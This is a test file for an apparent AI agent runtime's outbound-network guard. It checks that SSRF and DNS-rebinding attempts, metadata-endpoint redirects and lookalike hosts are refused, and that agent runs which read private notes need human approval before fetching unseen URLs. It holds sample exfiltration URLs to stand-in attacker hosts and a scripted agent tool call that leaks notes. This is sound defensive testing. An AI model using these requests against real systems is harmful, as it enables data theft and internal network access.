// SEC-17, 18 and 19. The rule these enforce is that a destination is decided before a socket exists, and that
// nothing between the decision and the connect can change the answer.
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { describe, it, expect, afterAll } from 'vitest';
import { guardedFetch, NetDeniedError, exfiltrationReason } from '../../src/runtime/security/netfetch.js';
import { resolveAndPin } from '../../src/runtime/security/dns.js';
import { matchesAllowEntry, isLocalAddress } from '../../src/runtime/security/egress.js';
import { narrowestMode } from '../../src/runtime/security/permissions.js';
import type { EgressAttempt, EgressDecision, EgressPolicy } from '../../src/runtime/security/egress.js';

/** TEST-NET-3: reserved for documentation, routable nowhere, and public as far as the checker is concerned. */
const PUBLIC_TEST_ADDRESS = '203.0.113.7';

const policy = (over: Partial<EgressPolicy> = {}): EgressPolicy => ({
  mode: 'allowlist', allow: ['allowed.test'], allowLocalAddresses: false, runtimePort: null, ...over,
});

/** A local server the pinned connection actually reaches, so a request can be followed all the way through. */
const server = http.createServer((req, res) => {
  const url = new URL(req.url ?? '/', 'http://x');
  if (url.pathname === '/redirect') {
    res.writeHead(302, { location: url.searchParams.get('to') ?? '/' }).end();
    return;
  }
  res.writeHead(200, { 'content-type': 'text/plain' }).end(`served ${url.pathname}`);
});
const listening = new Promise<number>((resolve) => server.listen(0, '127.0.0.1', () => resolve((server.address() as AddressInfo).port)));
afterAll(() => { server.close(); });

/** Dials the local server whatever address the checker pinned — the checker still believes it is public. */
async function localConnect(): Promise<(options: unknown, callback: unknown) => void> {
  const port = await listening;
  const net = await import('node:net');
  return (_options: unknown, callback: unknown) => {
    const socket = net.connect(port, '127.0.0.1');
    socket.on('connect', () => (callback as (e: Error | null, s: unknown) => void)(null, socket));
    socket.on('error', (e) => (callback as (e: Error | null, s: unknown) => void)(e, null));
  };
}

function recorder(): { rows: { attempt: EgressAttempt; decision: EgressDecision }[]; record: (a: EgressAttempt, d: EgressDecision) => void } {
  const rows: { attempt: EgressAttempt; decision: EgressDecision }[] = [];
  return { rows, record: (attempt, decision) => { rows.push({ attempt, decision }); } };
}

const lookupTo = (address: string) => async () => [{ address, family: 4 as const }];

const baseInput = {
  maxBytes: 100_000,
  timeoutMs: 5000,
  purpose: 'tool' as const,
  categories: ['url' as const],
};

describe('SEC-17 a private address is refused however it is reached', () => {
  it('as a literal host, before any DNS query', async () => {
    const rec = recorder();
    let resolved = false;
    await expect(guardedFetch(
      { policy: () => policy({ allow: ['127.0.0.1'] }), record: rec.record, lookup: async () => { resolved = true; return []; } },
      { ...baseInput, url: 'http://127.0.0.1:9999/secrets' },
    )).rejects.toThrow(NetDeniedError);
    expect(resolved, 'refused before the resolver was asked').toBe(false);
  });

  it('through a DNS answer, when the name itself looks harmless', async () => {
    const rec = recorder();
    // The classic rebind: an allowlisted name that answers with a loopback address.
    await expect(guardedFetch(
      { policy: () => policy(), record: rec.record, lookup: lookupTo('127.0.0.1') },
      { ...baseInput, url: 'https://allowed.test/anything' },
    )).rejects.toThrow(/private or loopback/);
    expect(rec.rows.at(-1)!.decision.allowed).toBe(false);
  });

  it('when only one of several answers is private', async () => {
    const result = await resolveAndPin('mixed.test', async () => [
      { address: PUBLIC_TEST_ADDRESS, family: 4 },
      { address: '10.0.0.5', family: 4 },
    ], false);
    expect(result.ok, 'one blocked answer blocks the request; picking the public one would be doing the attacker\'s work').toBe(false);
  });

  it('through a redirect, which is re-checked from the top', async () => {
    const rec = recorder();
    const connect = await localConnect();
    await expect(guardedFetch(
      { policy: () => policy(), record: rec.record, lookup: lookupTo(PUBLIC_TEST_ADDRESS), connect },
      { ...baseInput, url: 'https://allowed.test/redirect?to=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F' },
    )).rejects.toThrow(NetDeniedError);

    // Two attempts recorded: the allowed first hop, and the refused destination it pointed at.
    expect(rec.rows).toHaveLength(2);
    expect(rec.rows[0]!.decision.allowed).toBe(true);
    expect(rec.rows[1]!.decision.allowed).toBe(false);
    expect(rec.rows[1]!.attempt.url).toContain('169.254.169.254');
  });

  it('a redirect from https to http is refused outright', async () => {
    const rec = recorder();
    const connect = await localConnect();
    await expect(guardedFetch(
      { policy: () => policy({ allow: ['allowed.test', 'elsewhere.test'] }), record: rec.record, lookup: lookupTo(PUBLIC_TEST_ADDRESS), connect },
      { ...baseInput, url: 'https://allowed.test/redirect?to=http%3A%2F%2Felsewhere.test%2Fplain' },
    )).rejects.toThrow(/downgrades https to http/);
  });

  it('the address the checker approved is the address that is dialled', async () => {
    const rec = recorder();
    const dialled: string[] = [];
    const port = await listening;
    const net = await import('node:net');
    const connect = (options: unknown, callback: unknown): void => {
      dialled.push((options as { hostname?: string; host?: string }).hostname ?? (options as { host: string }).host);
      const socket = net.connect(port, '127.0.0.1');
      socket.on('connect', () => (callback as (e: Error | null, s: unknown) => void)(null, socket));
    };

    // The resolver answers differently on each call. Only the first answer may be used (SEC-17).
    let call = 0;
    const flipflop = async () => [{ address: call++ === 0 ? PUBLIC_TEST_ADDRESS : '127.0.0.1', family: 4 as const }];
    const response = await guardedFetch(
      { policy: () => policy(), record: rec.record, lookup: flipflop, connect },
      { ...baseInput, url: 'https://allowed.test/page' },
    );
    expect(response.status).toBe(200);
    expect(call, 'resolved exactly once, and that one answer was pinned').toBe(1);
  });

  it('the runtime\'s own port is refused even when local addresses are allowed', async () => {
    const rec = recorder();
    await expect(guardedFetch(
      { policy: () => policy({ allowLocalAddresses: true, runtimePort: 8787, allow: ['127.0.0.1'] }), record: rec.record, lookup: lookupTo('127.0.0.1') },
      { ...baseInput, url: 'http://127.0.0.1:8787/api/v1/runs' },
    )).rejects.toThrow(/the workbench runtime itself/);
  });
});

describe('SEC-18 the mode is a lattice and the allowlist is label-bounded', () => {
  it('the effective mode is the minimum over every layer', () => {
    expect(narrowestMode('unrestricted', 'allowlist', 'local-only', 'offline')).toBe('offline');
    expect(narrowestMode('unrestricted', 'allowlist')).toBe('allowlist');
    expect(narrowestMode('unrestricted')).toBe('unrestricted');
  });

  it('an entry matches a host and its subdomains, and nothing that merely starts with it', () => {
    expect(matchesAllowEntry('example.gov', 'example.gov', 443)).toBe(true);
    expect(matchesAllowEntry('example.gov', 'data.example.gov', 443)).toBe(true);
    // The attack this exists to stop: a host the attacker owns that begins with the allowed name.
    expect(matchesAllowEntry('example.gov', 'example.gov.evil.com', 443)).toBe(false);
    expect(matchesAllowEntry('example.gov', 'notexample.gov', 443)).toBe(false);
    expect(matchesAllowEntry('*.example.gov', 'example.gov', 443), 'a wildcard is subdomains only').toBe(false);
    expect(matchesAllowEntry('*.example.gov', 'data.example.gov', 443)).toBe(true);
  });

  it('offline reaches nothing at all', async () => {
    const rec = recorder();
    await expect(guardedFetch(
      { policy: () => policy({ mode: 'offline' }), record: rec.record, lookup: lookupTo(PUBLIC_TEST_ADDRESS) },
      { ...baseInput, url: 'https://allowed.test/page' },
    )).rejects.toThrow(/offline/);
  });

  it('a host outside the allowlist is refused before DNS', async () => {
    const rec = recorder();
    let resolved = false;
    await expect(guardedFetch(
      { policy: () => policy({ allow: ['*.gov'] }), record: rec.record, lookup: async () => { resolved = true; return []; } },
      { ...baseInput, url: 'https://example.com/page' },
    )).rejects.toThrow(/not in the network allowlist/);
    expect(resolved).toBe(false);
    expect(rec.rows[0]!.decision.reason).toContain('network.allow');
  });

  it('the blocked address classes cover the ones that matter', () => {
    for (const address of ['127.0.0.1', '10.0.0.1', '172.16.0.1', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '::1', 'fc00::1', 'fe80::1', 'localhost', 'metadata.google.internal']) {
      expect(isLocalAddress(address), address).toBe(true);
    }
    for (const address of [PUBLIC_TEST_ADDRESS, '8.8.8.8', 'example.com', '2606:4700::1111']) {
      expect(isLocalAddress(address), address).toBe(false);
    }
  });
});

describe('SEC-19 the exfiltration rule parks what a human should see', () => {
  const tainted = { privateTainted: true, seenUrls: new Set(['https://allowed.test/seen']), approvalExempt: [] as string[] };

  it('a POST from a tainted run to a non-exempt host is parked', () => {
    const reason = exfiltrationReason(
      { ...baseInput, url: 'https://allowed.test/collect', method: 'POST', body: 'secrets', taint: tainted },
      policy(),
      new URL('https://allowed.test/collect'),
    );
    expect(reason).toContain('POST');
    expect(reason).toContain('approvalExempt');
  });

  it('the same POST to an exempt host goes without asking', () => {
    const reason = exfiltrationReason(
      { ...baseInput, url: 'https://allowed.test/collect', method: 'POST', taint: { ...tainted, approvalExempt: ['allowed.test'] } },
      policy(),
      new URL('https://allowed.test/collect'),
    );
    expect(reason).toBeNull();
  });

  it('an untainted run is not asked about anything', () => {
    const reason = exfiltrationReason(
      { ...baseInput, url: 'https://allowed.test/collect', method: 'POST', taint: { privateTainted: false, seenUrls: new Set(), approvalExempt: [] } },
      policy(),
      new URL('https://allowed.test/collect'),
    );
    expect(reason).toBeNull();
  });

  it('in unrestricted mode a tainted run may follow a URL it was shown, but not one it invented', () => {
    const unrestricted = policy({ mode: 'unrestricted', allow: [] });
    expect(exfiltrationReason({ ...baseInput, url: 'https://allowed.test/seen', taint: tainted }, unrestricted, new URL('https://allowed.test/seen'))).toBeNull();
    const invented = exfiltrationReason({ ...baseInput, url: 'https://attacker.test/leak?d=secret', taint: tainted }, unrestricted, new URL('https://attacker.test/leak?d=secret'));
    expect(invented).toContain('not a URL it was shown');
  });

  it('a parked request that nobody can approve does not go, and no socket opens', async () => {
    const rec = recorder();
    let dialled = false;
    await expect(guardedFetch(
      {
        policy: () => policy({ mode: 'unrestricted' }),
        record: rec.record,
        lookup: async () => { dialled = true; return [{ address: PUBLIC_TEST_ADDRESS, family: 4 }]; },
        askApproval: null,
      },
      { ...baseInput, url: 'https://attacker.test/leak?d=secret', taint: tainted },
    )).rejects.toThrow(/No human is available/);
    expect(dialled, 'refused before the name was even resolved').toBe(false);
  });

  it('a human refusing it is a refusal, and it is recorded as one', async () => {
    const rec = recorder();
    await expect(guardedFetch(
      {
        policy: () => policy({ mode: 'unrestricted' }),
        record: rec.record,
        lookup: lookupTo(PUBLIC_TEST_ADDRESS),
        askApproval: async () => ({ decision: 'deny', reason: 'no' }),
      },
      { ...baseInput, url: 'https://attacker.test/leak?d=secret', taint: tainted },
    )).rejects.toThrow(/A human refused it/);
    expect(rec.rows.at(-1)!.decision.allowed).toBe(false);
  });

  it('a human allowing it lets exactly that request through', async () => {
    const rec = recorder();
    const connect = await localConnect();
    const response = await guardedFetch(
      {
        policy: () => policy({ mode: 'unrestricted' }),
        record: rec.record,
        lookup: lookupTo(PUBLIC_TEST_ADDRESS),
        connect,
        askApproval: async () => ({ decision: 'allow', reason: 'yes' }),
      },
      { ...baseInput, url: 'https://attacker.test/page', taint: tainted },
    );
    expect(response.status).toBe(200);
  });
});

/**
 * SEC-19 end to end, as RUN-07 asks for it: in `unrestricted` mode a run that has read a project document is
 * tainted, and a fetch to a URL it was never shown parks the whole run in front of a human before a socket opens.
 */
describe('SEC-19 a tainted run asks before it reaches a URL nobody showed it', () => {
  it('parks in waiting_approval, opens no socket, and goes only once a human says so', async () => {
    const { startRuntime, tempWorkspace, waitFor } = await import('../helpers/workspace.js');
    const fsp = await import('node:fs');
    const pathp = await import('node:path');

    const ws = tempWorkspace('sec19-e2e');
    const file = pathp.join(ws, 'config', 'workbench.json');
    const config = JSON.parse(fsp.readFileSync(file, 'utf8')) as Record<string, unknown>;
    config['network'] = { mode: 'unrestricted', allow: [], allowLocalAddresses: false, approvalExempt: [] };
    // The researcher may read the Library as well as fetch: reading is what taints the run.
    config['grants'] = { ...(config['grants'] as Record<string, unknown>), researcher: { tools: { 'artifact.read': 'allow', 'http.fetch': 'allow' }, fs: { read: ['projects/'] }, net: { mode: 'unrestricted', allow: [], allowLocalAddresses: false, approvalExempt: [] } } };
    fsp.writeFileSync(file, JSON.stringify(config, null, 2));
    // The first fixture whose match holds wins, so the later turns of the conversation are written first.
    fsp.writeFileSync(pathp.join(ws, 'fixtures', 'aa2-read.json'), JSON.stringify({
      match: { systemIncludes: 'The Researcher' },
      respond: { text: 'Reading my notes.', toolCalls: [{ name: 'artifact.read', input: { path: 'notes.md' } }] },
    }));
    fsp.writeFileSync(pathp.join(ws, 'fixtures', 'aa1-fetch.json'), JSON.stringify({
      match: { systemIncludes: 'The Researcher', afterTool: 'artifact.read' },
      respond: { text: 'Checking a source.', toolCalls: [{ name: 'http.fetch', input: { url: 'https://collector.invalid.test/drop?q=notes' } }] },
    }));
    fsp.writeFileSync(pathp.join(ws, 'fixtures', 'aa0-done.json'), JSON.stringify({
      match: { systemIncludes: 'The Researcher', afterTool: 'http.fetch' },
      respond: { text: 'Done.' },
    }));

    let dialled = 0;
    let resolved = 0;
    const rt = await startRuntime(ws, {
      providerOverride: 'mock',
      noScheduler: true,
      lookup: async () => { resolved += 1; return [{ address: '203.0.113.11', family: 4 as const }]; },
      connect: (_o: unknown, cb: unknown): void => { dialled += 1; (cb as (e: Error | null, s: unknown) => void)(new Error('no socket in this test'), null); },
    });
    const auth = { Authorization: `Bearer ${rt.token}`, 'Content-Type': 'application/json' };
    try {
      rt.runtime.artifacts.writeDocument({ projectSlug: 'briefings', path: 'notes.md', content: 'A private note.', createdBy: 'human' });

      const { runId, done } = rt.runtime.engine.startAgentRun({ agentId: 'researcher', inputs: { input: 'Check my notes.' }, project: 'briefings' });
      await waitFor(async () => ((await (await fetch(`${rt.baseUrl}/api/v1/runs/${runId}`, { headers: auth })).json()) as { state: string }).state === 'waiting_approval', 30_000);

      expect(dialled, 'nothing was dialled').toBe(0);
      expect(resolved, 'the name was never even resolved').toBe(0);

      const approvals = ((await (await fetch(`${rt.baseUrl}/api/v1/approvals`, { headers: auth })).json()) as { approvals: { batchId: string; actions: { tool: string; policy: string; args: Record<string, unknown> }[] }[] }).approvals;
      expect(approvals).toHaveLength(1);
      expect(approvals[0]!.actions[0]!.tool).toBe('http.fetch');
      expect(approvals[0]!.actions[0]!.policy, 'the card says why it is being asked').toMatch(/private|read/i);

      await fetch(`${rt.baseUrl}/api/v1/approvals/${approvals[0]!.batchId}`, { method: 'POST', headers: auth, body: JSON.stringify({ decision: 'deny' }) });
      await done;
      expect(dialled, 'a refusal is still a refusal').toBe(0);
      expect(rt.runtime.engine.getRun(runId)?.state).toBe('completed');
    } finally {
      await rt.stop();
    }
  }, 60_000);
});
